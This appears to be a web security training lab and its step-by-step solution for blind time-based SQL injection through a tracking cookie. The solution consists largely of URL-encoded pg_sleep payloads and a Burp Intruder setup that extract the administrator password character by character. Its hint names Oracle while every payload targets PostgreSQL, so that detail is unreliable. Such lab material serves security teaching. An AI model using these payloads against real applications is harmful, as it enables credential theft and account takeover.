# Lab: Blind SQL injection with time delays and information retrieval

### PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

```
Hint
```
This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Solution

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie.

2. Modify the <code>TrackingId</code> cookie, changing it to: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>. Verify that the application takes 10 seconds to respond.

3. Now change it to: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>. Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

4. Now change it to: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>. Verify that the condition is true, confirming that there is a user called <code>administrator</code>.

5. The next step is to determine how many characters are in the password of the <code>administrator</code> user. To do this, change the value to: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>. This condition should be true, confirming that the password is greater than 1 character in length.

6. Send a series of follow-up values to test different password lengths. Send: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>. Then send: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>. And so on. You can do this manually using <a href="/burp/documentation/desktop/tools/repeater">Burp Repeater</a>, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.

7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use <a href="/burp/documentation/desktop/tools/intruder">Burp Intruder</a>. Send the request you are working on to Burp Intruder, using the context menu.

8. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.

9. In the Positions tab, change the value of the cookie to: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>. This uses the <code>SUBSTRING()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

10. Place payload position markers around the <code>a</code> character in the cookie value. To do this, select just the <code>a</code>, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers): <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>

11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

12. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to <code>1</code>.

13. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

14. Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".

15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.

16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value: <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>

17. Launch the modified attack, review the results, and note the character at the second offset.

18. Continue this process testing offset 3, 4, and so on, until you have the whole password.

19. In your browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
